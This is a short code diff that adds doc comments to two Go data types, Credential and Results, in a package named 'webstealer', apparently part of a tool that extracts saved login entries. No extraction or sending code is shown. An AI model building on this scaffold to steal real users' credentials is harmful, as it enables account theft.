@@ -2,12 +2,14 @@ package webstealer
 
 import "net/url"
 
+// Credential stores one extracted login entry.
 type Credential struct {
 	URL      string
 	Username string
 	Password string
 }
 
+// Results groups extracted credentials.
 type Results struct {
 	Credentials []Credential
 }
